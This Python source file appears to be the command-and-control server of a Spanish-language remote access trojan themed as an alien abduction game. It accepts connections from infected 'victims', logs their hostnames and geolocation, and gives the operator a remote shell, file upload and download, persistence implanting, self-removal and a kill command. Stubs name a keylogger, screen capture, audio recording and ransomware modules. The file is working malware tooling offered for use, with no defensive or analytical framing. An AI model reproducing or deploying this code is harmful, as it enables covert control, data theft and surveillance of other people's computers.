
# CONFIGURACIONES PARA EL SERVIDOR ALIENIGENA

import os
import sys
import time
import socket
import pygame	

import utilidades.creador_ayuda as ayuda

from tabulate import tabulate
from threading import Thread
from utilidades.banners import *
from utilidades.cadenas import chain_alien



# ----------------------------------------------------------------------------------------


# MODO LIVE PARA ABDUCCION 
EnVivo=False


def cargar_banda_sonora(musica):
	pygame.mixer.music.load(os.getcwd() + musica)
	pygame.mixer.music.play(loops=-1)
	return


def cartelAyuda():
	print("""\033[0;39m

 \033[1;31m[-] Puedes tipear 'ayuda' para ver los comandos disponibles

	""")
	return

def encabezados(banner):
	os.system('clear')
	if banner=="principal":
		banner_principal()
	elif banner=="secundario":
		banner_secundario()
	elif banner=="abduccion":
		banner_abduction_menu()
	elif banner=="laboratorio":
		banner_laboratorio()
	elif banner=="manipular":
		banner_manipular()
	cartelAyuda()
	return


def desplegar_ayuda(COMANDOS,tipo):
	if tipo=="principal":
		ayuda.comandos(COMANDOS,"Comandos generales")
		ayuda.comandos_basicos('secundario')
	
	elif tipo=="abducciones":
		ayuda.comandos(COMANDOS,"Comandos abducciones")
		ayuda.comandos_basicos('secundario')

	elif tipo=="laboratorio":
		ayuda.comandos(COMANDOS,'Comandos laboratorio')
		ayuda.comandos_basicos('secundario')

	elif tipo=="manipular":
		ayuda.comandos(COMANDOS,'Comandos para manipulacion de victima')
		ayuda.comandos_basicos('secundario')

	elif tipo=="cmd":
		ayuda.comandos(COMANDOS,'Comandos shell')

	return


def ataques():

	import random

	frases = [

	"Aniquilaste a victima con rayo desintegrador",
	"Perforando el ano del objetivo. La cabeza de la victima ha sido explotada",
	"Aturdiendo al individuo con rayos de electricidad",
	"Has disparado una poderosa bomba de iones sobre el terricola",
	"Has extraido el cerebro del individuo, quitandole la vida de manera rapida",
	"Lanzando gusano alienigena para devorar objetivo"
	
	]

	return random.choice(frases)


# ------------------------------------------------------------------------------------------



class Server(Thread):


	# --------- CONFIGURACION DEL SERVIDOR ---------

	def __init__(self,ip="0.0.0.0",port=9000):
		super(Server, self).__init__()

		self.terricolas = []
		self.ip = ip
		self.port = int(port)

		try:

			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

			self.server.bind((self.ip,self.port))
			self.server.listen(5)

		except socket.error as e:
			print (" Error: ",e)


	# --------- ENVIAR MENSAJES ---------

	def enviar(self,server,mensaje):
		server.send(bytes(mensaje,'utf-8'))
		return


	# --------- RECIBIR MENSAJES ---------

	def recibir(self,server):
		raw_msg = server.recv(4096)
		msg = (raw_msg).decode('utf-8')
		return msg


	# --------- OBTENER INFORMACION --------- 

	def obtener_informacion(self,client,address):
		hostname = self.recibir(client)
		self.enviar(client,"ready")
		ip_info = (self.recibir(client)).split(',')
		ciudad = ip_info[0]
		ip_public = ip_info[1]
		pais = ip_info[2]
		estado = ip_info[3]
		geolocation = {'city_name':ciudad, 'IPv4':ip_public, 'country_name':pais, 'state':estado}
		return [client,address,hostname,geolocation]



	# --------- ESCRIBIR INFORMACION --------- 

	def EscribirInformacion(self,info):
		inf = "['"+info[2]+"',"+str(info[3])+","+str(info[1][1])+"]\n"
		with open('core/abducciones/capturados.txt','a+') as archivo:
			archivo.write(inf)
		return


	# --------- ABDUCIR VICTIMAS ---------

	def run(self):

		while (True):
			try:
				conexion, address = self.server.accept()
				conexion.setblocking(1)
				client_info = self.obtener_informacion(conexion,address)
				self.terricolas.append(client_info)
				self.EscribirInformacion(client_info)
			except Exception as e:
				print(' Error al abducir a un terricola: ',e)
				continue

		return


	def VerAbducciones(self):
		os.system('xterm -hold -fg white -bg black -geometry 93x31+0+100 -title "Abduccion en vivo" -e python3 core/abducciones/pantalla.py &')
		return


	# --------- LISTAR VICTIMAS ---------

	def ver_terricolas(self):

		lista_terricolas_table = []

		for terricola in self.terricolas:
			lista_terricolas_table.append([terricola[2],terricola[3]["country_name"],terricola[3]["city_name"]])

		if(len(self.terricolas)>0):
			print ("\n")
			print (" \033[1;34mLista de personas secuestradas\033[0;39m\n")
			index = [i for i in range(1,len(self.terricolas)+1)]
			print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad" ], showindex=index),"\n\n")

		else:
		 	print("\n [\033[1;31mx\033[0;39m] No hay personas capturadas\n")

		return



	# --------- REMOVER REGISTRO DE VICTIMA -------------

	def remover_terricola(self,client):
		return self.terricolas.pop(client)	



	# --------- MATAR A UN SECUESTRADO ESPECIFICO -------------
	
	def matar_terricola(self,client):

		self.enviar(self.terricolas[client][0],"matar")
		self.remover_terricola(client)
		return




	# --------- MATAR A TODAS LAS VICTIMAS CAPTURADAS ---------

	def matar_terricolas(self):

		if(len(self.terricolas)>0):
			print(" \n [\033[1;34m*\033[0;39m] Preparandote para acabar con los individuos...\n")
			time.sleep(2)

			for terricola in self.terricolas:
				print(" [\033[1;34m*\033[0;39m] Matando a terricola " + terricola[2])
				print(" [\033[1;34m*\033[0;39m] " + ataques())
				
				self.enviar(terricola[0],'matar')
				time.sleep(0.5)

			self.terricolas.clear()
			print("\n [!] Ha eliminado a todos los secuestrados!\n\n")
		
		else:
			print(" \n [\033[1;31mx\033[0;39m] No hay terricolas\n")

		return



	# --------- DETENER SERVIDOR ---------

	def destruir_evidencias(self):
		for terricola in self.terricolas:
			self.enviar(terricola[0],"matar")
			time.sleep(0.5)
		
		self.terricolas.clear()
		return


	def detener(self):
		self.destruir_evidencias()
		#self.server.shutdown(socket.SHUT_RDWR)
		self.server.close()
		return



# -----------------------------------------------------------------------------------------

class Control():

	def run_cmd(servidor,client):
		
		COMANDOS = {

		"{detener|exit}" : ["stop","Detiene temporalmente a la victima"]

		}

		servidor.enviar(servidor.terricolas[client][0],"cmd")

		sesion = input(" (\033[0;31m" + servidor.terricolas[client][2] + "\033[0;39m)> ")

		while(True):
			try:

				if(sesion!=""):
					if("cd " in sesion):
						servidor.enviar(servidor.terricolas[client][0],sesion)
						location = servidor.recibir(servidor.terricolas[client][0])
						print(location)

					elif (sesion=="detener") or (sesion=="exit"):
						servidor.enviar(servidor.terricolas[client][0],sesion)
						t = servidor.recibir(servidor.terricolas[client][0])
						print(t)
						break

					elif (sesion=="ayuda"):
						desplegar_ayuda(COMANDOS,'cmd')

					else:
						servidor.enviar(servidor.terricolas[client][0],sesion)
						longitud = int(servidor.recibir(servidor.terricolas[client][0]))

						data = []

						while(True):
							datos = servidor.recibir(servidor.terricolas[client][0])
							data.append(datos)
							if (len(data)==longitud):
								break
		
						for _ in data:
							print(_.rstrip('\n'))


				sesion = input(" (\033[0;31m" + servidor.terricolas[client][2] + "\033[0;39m)> ")

			except Exception as e:
				print(" Error de comunicacion con vicitma: ",e)
				break

		return


	def subir_archivos(servidor,client,origen,destino):

		# Envia modo de uso y recibe el 'ok'
		servidor.enviar(servidor.terricolas[client][0],"subir")
		servidor.recibir(servidor.terricolas[client][0])

		# Envia el destino donde se va a guardar el archivo
		servidor.enviar(servidor.terricolas[client][0],destino)
		servidor.recibir(servidor.terricolas[client][0])
		time.sleep(0.1)

		servidor.enviar(servidor.terricolas[client][0],str(os.path.getsize(origen)))
		servidor.recibir(servidor.terricolas[client][0])
		time.sleep(1)

		# Se prepara para el envio de datos del archivo
		with open(origen, "rb") as archivo_origen:
				contenido = archivo_origen.read(1024)
				while contenido:
					servidor.terricolas[client][0].sendall(contenido)
					contenido = archivo_origen.read(1024)

		print(" El archivo se subio correctamente.")    

		return


	def descargar_archivos(servidor,client,origen,destino):

		# Envia modo de uso y recibe el 'ok'
		servidor.enviar(servidor.terricolas[client][0],"descargar")
		servidor.recibir(servidor.terricolas[client][0])


		# Envia ruta a descargar
		servidor.enviar(servidor.terricolas[client][0],origen)
		time.sleep(0.1)

		size = int(servidor.recibir(servidor.terricolas[client][0]))
		servidor.enviar(servidor.terricolas[client][0],"ok")

		#print(size)

		# Abre el archivo nuevo 
		with open(destino, "wb") as archivo_destino:
			#contenido = self.client.recv(1024)
			#print(os.path.getsize(destino))
			while (size>0):
				contenido = servidor.terricolas[client][0].recv(1024)
				archivo_destino.write(contenido)
				size-=len(contenido)
				#print(size)

		print(" El archivo se descargo correctamente.")   

			
		return


	def ls(servidor,client):
		return

	def pwd(servidor,client):
		return

	def cd(servidor,client):
		return


	def netcat(servidor,client):
		#servidor.enviar(servidor.terricolas[client][0],"netcat")
		#os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Victima Netcat" -e nc -lp 9001 &')
		return (" Modulo en desarrollo")

	def persistencia(servidor,client):

		servidor.enviar(servidor.terricolas[client][0],"persistencia")
		msg = servidor.recibir(servidor.terricolas[client][0])
		print (msg)
		return


	def autoremoverse(servidor,client):

		servidor.enviar(servidor.terricolas[client][0],"autoremover")
		msg = servidor.recibir(servidor.terricolas[client][0])
		print (msg)
		return


	def keylogger(servidor,client):
		return


	def screenshot(servidor,client):
		return


	def grabarAudio(servidor,client):
		return


	def ransomware(servidor,client):
		return



# --------------------- MENUS --------------------------------------------

def manipular(servidor,cliente):

	COMANDOS = {

	"cmd" : ["shell","Ejecutar shell"],
	"netcat" : ["netcat","Utiliza netcat para obtener un shell inversa"],
	"subir" : ["upload","Subir archivo a equipo remoto"],
	"descargar" : ["download","Descargar archivo de equipo remoto"],
	"persistencia" : ["persistence","Implantar bicho en el cerebro victima"],
	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"],

	}

	encabezados('manipular')
	victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')

	while (victima!="volver"):

		if (victima=="cmd"):
			Control.run_cmd(servidor,cliente)
			encabezados('manipular')

		elif (victima=="subir"):
			origen = input(' Ruta archivo atacante: ')
			destino = input(' Ruta archivo victima: ')
			Control.subir_archivos(servidor,cliente,origen,destino)

		elif (victima=="descargar"):
			origen = input(' Ruta archivo victima: ')
			destino = input(' Ruta archivo atacante: ')
			Control.descargar_archivos(servidor,cliente,origen,destino)

		elif (victima=="netcat"):
			os.system('clear')
			banner_manipular()
			Control.netcat(servidor,cliente)
			encabezados('manipular')

		elif (victima=="persistencia"):
			Control.persistencia(servidor,cliente)
			#encabezados('manipular')

		elif (victima=="ayuda"):
			desplegar_ayuda(COMANDOS,'manipular')

		elif (victima==""):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "',victima, '" no encontrado.\n')

		victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')

	return


def laboratorio(servidor):

	COMANDOS = {

	"manipular <id>" : ["Manipulation","Controlar a un individuo especifico"],
	"matar <id>" : ["Kill","Sirve para asesinar al terricola"],
	"listar": ["List","Lista a las personas comprometidas de manera interactiva"],

	}

	lista_terricolas_table = []

	for terricola in servidor.terricolas:
		lista_terricolas_table.append([terricola[2],terricola[3]["country_name"],terricola[3]["city_name"],terricola[1][0],terricola[3]["IPv4"],terricola[1][1]])

	encabezados("laboratorio")

	print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")

	prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')

	while(prompt_laboratorio!="volver"):

		if ('manipular' in prompt_laboratorio):
			try:
				cliente = int(prompt_laboratorio.replace('manipular', ''))-1

				if (cliente < len(servidor.terricolas)) and (cliente>=0):
					manipular(servidor,cliente)
					encabezados("laboratorio")
					print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
				else:
					print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

			except ValueError as e:
				#print(e)
				print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");

		elif ('matar' in prompt_laboratorio):
			try:
				cliente = int(prompt_laboratorio.replace('matar', ''))-1
				
				if (cliente < len(servidor.terricolas)) and (cliente>=0):
					servidor.matar_terricola(cliente)
					lista_terricolas_table.pop(cliente)
					print("\n [\033[1;34m*\033[0;39m] " + ataques())
				else:
					print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

			except ValueError:
				print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");

		elif (prompt_laboratorio=="listar"):
			if(len(servidor.terricolas)>0):
				print ("\n")

				print (" \033[1;34mLista de personas secuestradas\033[0;39m\n")

				index = [i for i in range(1,len(servidor.terricolas)+1)]
				print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"], showindex=index),"\n\n")

			else:
				print("\n [\033[1;31mx\033[0;39m] No hay personas secuestradas\n")

		elif (prompt_laboratorio=="ayuda"):
			desplegar_ayuda(COMANDOS,'laboratorio')

		elif (prompt_laboratorio==""):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')


		prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower())

	return


def AbduccionEnVivo(servidor):
	global EnVivo

	if (EnVivo==False):
		EnVivo=True
		servidor.VerAbducciones()
	else:
		print(" Modo abduccion en vivo: activo")
		activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		while (activar!="s") and (activar!="n"):
			print(" Opcion inexistente... Intente nuevamente...")
			activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		if (activar=="s"):
			os.system('pkill -9 -f xterm')
			EnVivo=False
			print(" Modo abduccion en vivo: desactivado")
			time.sleep(2.5)
	return


def abducciones_menu(servidor):

	COMANDOS = {

	"pantalla" : ["Screen","Permite ver el proceso de abduccion en modo real"],
	"abducidos" : ["Abducted","Lista todas las personas secuestradas"],

	}
	
	pygame.init()
	cargar_banda_sonora("/core/musica/abduction.mp3")

	encabezados("abduccion")

	selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while (selector!='volver'):

		if (selector=='pantalla'):
			AbduccionEnVivo(servidor)
			encabezados("abduccion")

		elif (selector=='abducidos'):
			servidor.ver_terricolas()

		elif (selector=='ayuda'):
			desplegar_ayuda(COMANDOS,"abducciones")

		elif(selector == ''):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "', selector, '" no encontrado.\n')

		selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	return


def menu():

	COMANDOS = {

	"abducir" : ["Abduct","Acceder al menu de abducciones"],
	"laboratorio" : ["Laboratory","Acceder al laboratorio"],
	"destruirlos" : ["Massive Destruction","Destruye a todos los individuos comprometidos"]

	}

	servidor = Server()
	servidor.setDaemon(True)
	servidor.start()

	pygame.init()
	cargar_banda_sonora("/core/musica/laboratory.mp3")

	encabezados("secundario")

	opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while(opcion!="volver"):

		if(opcion=="abducir"):
			abducciones_menu(servidor)
			cargar_banda_sonora("/core/musica/laboratory.mp3")
			encabezados("secundario")
		elif(opcion=="laboratorio"):
			laboratorio(servidor)
			encabezados("secundario")
		elif(opcion=="destruirlos"):
			servidor.matar_terricolas()
		elif(opcion=="ayuda"):
			desplegar_ayuda(COMANDOS,"principal")	
		elif(opcion=="limpiar"):
			encabezados("secundario")
		elif(opcion==''):
			pass
		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "', opcion, '" no encontrado.\n')


		opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	os.system('pkill -9 -f xterm')
	os.system('clear')
	servidor.detener()

	return


if __name__ == '__main__':
	menu()
